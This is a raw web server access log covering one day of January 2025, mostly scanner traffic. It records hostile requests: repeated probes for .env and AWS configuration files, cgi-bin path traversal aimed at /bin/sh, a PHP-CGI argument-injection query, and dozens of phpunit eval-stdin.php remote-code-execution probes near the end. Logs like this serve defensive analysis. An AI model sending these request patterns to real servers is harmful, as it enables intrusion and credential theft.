78.153.140.148 - - [18/Jan/2025:06:30:40 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
146.19.24.168 - - [18/Jan/2025:06:38:25 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
146.19.24.18 - - [18/Jan/2025:06:52:24 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
49.0.65.53 - - [18/Jan/2025:06:54:40 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
179.43.191.146 - - [18/Jan/2025:07:11:36 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
193.142.146.175 - - [18/Jan/2025:07:27:44 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
193.142.146.175 - - [18/Jan/2025:07:27:45 +0000] "GET /logon.htm HTTP/1.1" 302 331 "-" "Hello World"
66.175.213.4 - - [18/Jan/2025:07:45:29 +0000] "\x16\x03\x01" 400 523 "-" "-"
198.235.24.145 - - [18/Jan/2025:07:48:25 +0000] "\x16\x03\x01" 400 523 "-" "-"
198.235.24.145 - - [18/Jan/2025:07:48:25 +0000] "\x16\x03\x01" 400 523 "-" "-"
87.120.115.34 - - [18/Jan/2025:07:50:54 +0000] "GET /.env HTTP/1.1" 302 350 "-" "Mozilla/5.0 (ZZ; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0"
78.153.140.148 - - [18/Jan/2025:07:50:56 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.148 - - [18/Jan/2025:07:50:56 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
172.168.41.125 - - [18/Jan/2025:08:28:47 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 zgrab/0.x"
146.19.24.168 - - [18/Jan/2025:08:43:40 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
5.181.190.248 - - [18/Jan/2025:08:48:07 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
193.142.146.175 - - [18/Jan/2025:09:01:51 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
193.142.146.175 - - [18/Jan/2025:09:01:52 +0000] "GET /logon.htm HTTP/1.1" 302 331 "-" "Hello World"
78.153.140.148 - - [18/Jan/2025:09:04:05 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.148 - - [18/Jan/2025:09:04:05 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
206.189.152.11 - - [18/Jan/2025:09:10:23 +0000] "GET /cdn-cgi/trace HTTP/1.1" 302 350 "-" "Mozilla/5.0"
206.189.152.11 - - [18/Jan/2025:09:10:26 +0000] "\x16\x03\x01\x01\v\x01" 400 523 "-" "-"
206.189.152.11 - - [18/Jan/2025:09:10:50 +0000] "GET /cdn-cgi/trace HTTP/1.1" 302 350 "-" "Mozilla/5.0"
206.189.152.11 - - [18/Jan/2025:09:10:54 +0000] "\x16\x03\x01\x01\v\x01" 400 523 "-" "-"
66.240.192.85 - - [18/Jan/2025:09:14:57 +0000] "\x16\x03\x01" 400 523 "-" "-"
205.210.31.138 - - [18/Jan/2025:09:34:28 +0000] "GET / HTTP/1.0" 200 1761 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
45.156.130.13 - - [18/Jan/2025:09:38:20 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36"
146.19.24.18 - - [18/Jan/2025:09:42:40 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
162.142.125.220 - - [18/Jan/2025:09:50:38 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
162.142.125.220 - - [18/Jan/2025:09:50:48 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
162.142.125.220 - - [18/Jan/2025:09:50:49 +0000] "GET /favicon.ico HTTP/1.1" 302 350 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
162.142.125.220 - - [18/Jan/2025:09:50:51 +0000] "GET / HTTP/1.1" 200 966 "http://226.81.165.34.bc.googleusercontent.com/favicon.ico" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
162.142.125.220 - - [18/Jan/2025:09:50:52 +0000] "PRI * HTTP/2.0" 400 523 "-" "-"
192.155.90.220 - - [18/Jan/2025:09:54:52 +0000] "\x16\x03\x01" 400 523 "-" "-"
80.82.77.202 - - [18/Jan/2025:10:04:04 +0000] "\x16\x03\x02\x01o\x01" 400 523 "-" "-"
45.43.33.210 - - [18/Jan/2025:10:08:48 +0000] "GET / HTTP/1.1" 200 1761 "-" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:130.0) Gecko/20100101 Firefox/130.0"
185.196.220.253 - - [18/Jan/2025:10:22:48 +0000] "GET / HTTP/1.1" 200 1742 "-" "Hello World"
80.82.77.202 - - [18/Jan/2025:10:42:19 +0000] "GET / HTTP/1.0" 200 1761 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2869.0 Safari/537.36"
95.214.55.185 - - [18/Jan/2025:10:51:55 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
46.19.138.234 - - [18/Jan/2025:10:59:26 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
96.84.109.202 - - [18/Jan/2025:11:03:13 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
185.16.39.104 - - [18/Jan/2025:11:14:46 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
34.38.226.167 - - [18/Jan/2025:11:32:48 +0000] "GET / HTTP/1.1" 200 1003 "-" "python-requests/2.32.3"
193.142.146.175 - - [18/Jan/2025:11:33:50 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
193.142.146.175 - - [18/Jan/2025:11:33:50 +0000] "GET /logon.htm HTTP/1.1" 302 331 "-" "Hello World"
146.19.24.168 - - [18/Jan/2025:11:44:49 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
78.153.140.148 - - [18/Jan/2025:11:46:21 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.148 - - [18/Jan/2025:11:46:21 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
13.91.224.85 - - [18/Jan/2025:12:42:15 +0000] "MGLNDD_34.165.81.226_80\n" 400 523 "-" "-"
193.34.212.75 - - [18/Jan/2025:13:07:07 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
179.43.191.146 - - [18/Jan/2025:13:19:35 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
139.59.101.104 - - [18/Jan/2025:13:35:15 +0000] "GET /cdn-cgi/trace HTTP/1.1" 302 350 "-" "Mozilla/5.0"
78.153.140.148 - - [18/Jan/2025:13:39:28 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.148 - - [18/Jan/2025:13:39:28 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
146.19.24.168 - - [18/Jan/2025:13:40:24 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
5.181.190.248 - - [18/Jan/2025:14:03:17 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
193.142.146.175 - - [18/Jan/2025:14:28:59 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
193.142.146.175 - - [18/Jan/2025:14:28:59 +0000] "GET /logon.htm HTTP/1.1" 302 331 "-" "Hello World"
87.120.115.34 - - [18/Jan/2025:14:56:33 +0000] "GET /_profiler/phpinfo HTTP/1.1" 302 350 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Safari/605.1.45"
65.49.1.111 - - [18/Jan/2025:14:57:04 +0000] "\x16\x03\x01" 400 523 "-" "-"
146.19.24.168 - - [18/Jan/2025:15:00:36 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
78.153.140.148 - - [18/Jan/2025:15:28:39 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.148 - - [18/Jan/2025:15:28:39 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
49.0.80.171 - - [18/Jan/2025:15:30:02 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
185.196.220.253 - - [18/Jan/2025:15:47:09 +0000] "GET / HTTP/1.1" 200 1742 "-" "Hello World"
5.181.190.248 - - [18/Jan/2025:15:50:45 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
139.59.101.104 - - [18/Jan/2025:16:13:34 +0000] "GET /cdn-cgi/trace HTTP/1.1" 302 350 "-" "Mozilla/5.0"
181.129.21.74 - - [18/Jan/2025:16:14:48 +0000] "GET / HTTP/1.1" 200 1742 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
193.142.146.175 - - [18/Jan/2025:16:20:27 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
193.142.146.175 - - [18/Jan/2025:16:20:27 +0000] "GET /logon.htm HTTP/1.1" 302 331 "-" "Hello World"
78.153.140.148 - - [18/Jan/2025:16:50:30 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.148 - - [18/Jan/2025:16:50:31 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
46.19.138.234 - - [18/Jan/2025:17:14:01 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
167.172.90.143 - - [18/Jan/2025:17:16:39 +0000] "GET /cdn-cgi/trace HTTP/1.1" 302 350 "-" "Mozilla/5.0"
167.172.90.143 - - [18/Jan/2025:17:16:43 +0000] "\x16\x03\x01\x01\v\x01" 400 523 "-" "-"
167.172.90.143 - - [18/Jan/2025:17:17:05 +0000] "GET /cdn-cgi/trace HTTP/1.1" 302 350 "-" "Mozilla/5.0"
167.172.90.143 - - [18/Jan/2025:17:17:08 +0000] "\x16\x03\x01\x01\v\x01" 400 523 "-" "-"
45.79.181.104 - - [18/Jan/2025:17:52:30 +0000] "\x16\x03\x01" 400 523 "-" "-"
5.181.190.248 - - [18/Jan/2025:18:00:06 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
146.19.24.168 - - [18/Jan/2025:18:38:21 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
111.253.165.193 - - [18/Jan/2025:18:55:40 +0000] "GET / HTTP/1.1" 200 1742 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
111.253.165.193 - - [18/Jan/2025:18:55:41 +0000] "GET / HTTP/1.1" 200 1742 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
78.153.140.148 - - [18/Jan/2025:19:06:42 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.148 - - [18/Jan/2025:19:06:43 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
193.142.146.175 - - [18/Jan/2025:19:11:27 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
193.142.146.175 - - [18/Jan/2025:19:11:27 +0000] "GET /logon.htm HTTP/1.1" 302 331 "-" "Hello World"
205.210.31.108 - - [18/Jan/2025:19:21:38 +0000] "GET / HTTP/1.0" 200 1761 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
146.19.24.168 - - [18/Jan/2025:19:40:04 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
78.153.140.148 - - [18/Jan/2025:19:42:31 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.148 - - [18/Jan/2025:19:42:31 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
185.16.39.104 - - [18/Jan/2025:19:43:02 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
95.214.55.185 - - [18/Jan/2025:19:50:30 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
179.43.191.146 - - [18/Jan/2025:19:51:28 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
5.181.190.248 - - [18/Jan/2025:20:35:35 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
193.34.212.75 - - [18/Jan/2025:20:57:28 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
78.153.140.148 - - [18/Jan/2025:21:06:22 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.148 - - [18/Jan/2025:21:06:22 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
193.142.146.175 - - [18/Jan/2025:21:16:59 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
193.142.146.175 - - [18/Jan/2025:21:16:59 +0000] "GET /logon.htm HTTP/1.1" 302 331 "-" "Hello World"
206.168.34.215 - - [18/Jan/2025:21:42:18 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
206.168.34.215 - - [18/Jan/2025:21:42:26 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
206.168.34.215 - - [18/Jan/2025:21:42:27 +0000] "GET /favicon.ico HTTP/1.1" 302 350 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
206.168.34.215 - - [18/Jan/2025:21:42:27 +0000] "GET / HTTP/1.1" 200 966 "http://34.165.81.226/favicon.ico" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
206.168.34.215 - - [18/Jan/2025:21:42:28 +0000] "PRI * HTTP/2.0" 400 523 "-" "-"
45.79.181.251 - - [18/Jan/2025:21:46:40 +0000] "\x16\x03\x01" 400 523 "-" "-"
178.215.236.132 - - [18/Jan/2025:21:49:27 +0000] "GET /.env HTTP/1.1" 302 350 "-" "Mozilla/5.0 (Linux; Android 8.1.0; Redmi Note 5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.89 Mobile Safari/537.36"
185.196.220.253 - - [18/Jan/2025:21:53:43 +0000] "GET / HTTP/1.1" 200 1742 "-" "Hello World"
34.38.239.34 - - [18/Jan/2025:22:24:28 +0000] "GET / HTTP/1.1" 200 1003 "-" "python-requests/2.32.3"
80.82.77.202 - - [18/Jan/2025:22:26:24 +0000] "GET / HTTP/1.0" 200 1761 "-" "Mozilla/5.0 (Linux; Android 5.0; ASUS_Z00AD) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.89 Mobile Safari/537.36"
80.82.77.202 - - [18/Jan/2025:23:00:11 +0000] "\x16\x03\x02\x01o\x01" 400 523 "-" "-"
78.153.140.148 - - [18/Jan/2025:23:03:11 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.148 - - [18/Jan/2025:23:03:11 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
146.19.24.168 - - [18/Jan/2025:23:09:30 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
198.235.24.140 - - [18/Jan/2025:23:20:51 +0000] "\x16\x03\x01" 400 523 "-" "-"
198.235.24.140 - - [18/Jan/2025:23:20:51 +0000] "\x16\x03\x01" 400 523 "-" "-"
167.94.145.110 - - [18/Jan/2025:23:21:42 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
167.94.145.110 - - [18/Jan/2025:23:21:45 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
167.94.145.110 - - [18/Jan/2025:23:21:45 +0000] "GET /favicon.ico HTTP/1.1" 302 350 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
167.94.145.110 - - [18/Jan/2025:23:21:45 +0000] "GET / HTTP/1.1" 200 966 "http://34.165.81.226/favicon.ico" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
167.94.145.110 - - [18/Jan/2025:23:21:45 +0000] "PRI * HTTP/2.0" 400 523 "-" "-"
46.19.138.234 - - [18/Jan/2025:23:41:10 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
198.235.24.22 - - [18/Jan/2025:23:45:02 +0000] "GET / HTTP/1.0" 200 1761 "-" "Expanse, a Palo Alto Networks company, searches across the global IPv4 space multiple times per day to identify customers&#39; presences on the Internet. If you would like to be excluded from our scans, please send IP addresses/domains to: scaninfo@paloaltonetworks.com"
112.126.68.98 - - [18/Jan/2025:23:49:16 +0000] "GET /config/aws.yml HTTP/1.1" 302 331 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Mobile/15E148 Safari/604.1"
146.19.24.18 - - [18/Jan/2025:23:52:55 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
38.242.215.19 - - [18/Jan/2025:23:56:17 +0000] "POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1" 400 487 "-" "Custom-AsyncHttpClient"
38.242.215.19 - - [18/Jan/2025:23:56:17 +0000] "POST /cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/bin/sh HTTP/1.1" 400 487 "-" "Custom-AsyncHttpClient"
38.242.215.19 - - [18/Jan/2025:23:56:18 +0000] "POST /hello.world?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input HTTP/1.1" 302 387 "-" "Custom-AsyncHttpClient"
38.242.215.19 - - [18/Jan/2025:23:56:18 +0000] "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
38.242.215.19 - - [18/Jan/2025:23:56:18 +0000] "GET /vendor/phpunit/phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
38.242.215.19 - - [18/Jan/2025:23:56:18 +0000] "GET /vendor/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
38.242.215.19 - - [18/Jan/2025:23:56:18 +0000] "GET /vendor/phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
38.242.215.19 - - [18/Jan/2025:23:56:19 +0000] "GET /vendor/phpunit/phpunit/LICENSE/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
38.242.215.19 - - [18/Jan/2025:23:56:19 +0000] "GET /vendor/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
38.242.215.19 - - [18/Jan/2025:23:56:19 +0000] "GET /phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
38.242.215.19 - - [18/Jan/2025:23:56:19 +0000] "GET /phpunit/phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
38.242.215.19 - - [18/Jan/2025:23:56:19 +0000] "GET /phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
38.242.215.19 - - [18/Jan/2025:23:56:20 +0000] "GET /phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
38.242.215.19 - - [18/Jan/2025:23:56:20 +0000] "GET /lib/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
38.242.215.19 - - [18/Jan/2025:23:56:20 +0000] "GET /lib/phpunit/phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
38.242.215.19 - - [18/Jan/2025:23:56:20 +0000] "GET /lib/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
38.242.215.19 - - [18/Jan/2025:23:56:20 +0000] "GET /lib/phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
38.242.215.19 - - [18/Jan/2025:23:56:21 +0000] "GET /lib/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
38.242.215.19 - - [18/Jan/2025:23:56:21 +0000] "GET /laravel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
38.242.215.19 - - [18/Jan/2025:23:56:21 +0000] "GET /www/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
38.242.215.19 - - [18/Jan/2025:23:56:21 +0000] "GET /ws/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
38.242.215.19 - - [18/Jan/2025:23:56:21 +0000] "GET /yii/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
38.242.215.19 - - [18/Jan/2025:23:56:22 +0000] "GET /zend/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
38.242.215.19 - - [18/Jan/2025:23:56:22 +0000] "GET /ws/ec/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
38.242.215.19 - - [18/Jan/2025:23:56:22 +0000] "GET /V2/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
38.242.215.19 - - [18/Jan/2025:23:56:23 +0000] "GET /tests/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
38.242.215.19 - - [18/Jan/2025:23:56:23 +0000] "GET /test/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
38.242.215.19 - - [18/Jan/2025:23:56:23 +0000] "GET /testing/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
38.242.215.19 - - [18/Jan/2025:23:56:23 +0000] "GET /api/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
38.242.215.19 - - [18/Jan/2025:23:56:23 +0000] "GET /demo/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
38.242.215.19 - - [18/Jan/2025:23:56:23 +0000] "GET /cms/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
38.242.215.19 - - [18/Jan/2025:23:56:24 +0000] "GET /crm/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
38.242.215.19 - - [18/Jan/2025:23:56:24 +0000] "GET /admin/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
38.242.215.19 - - [18/Jan/2025:23:56:24 +0000] "GET /backup/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
38.242.215.19 - - [18/Jan/2025:23:56:24 +0000] "GET /blog/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
38.242.215.19 - - [18/Jan/2025:23:56:24 +0000] "GET /workspace/drupal/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
38.242.215.19 - - [18/Jan/2025:23:56:24 +0000] "GET /panel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
38.242.215.19 - - [18/Jan/2025:23:56:25 +0000] "GET /public/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
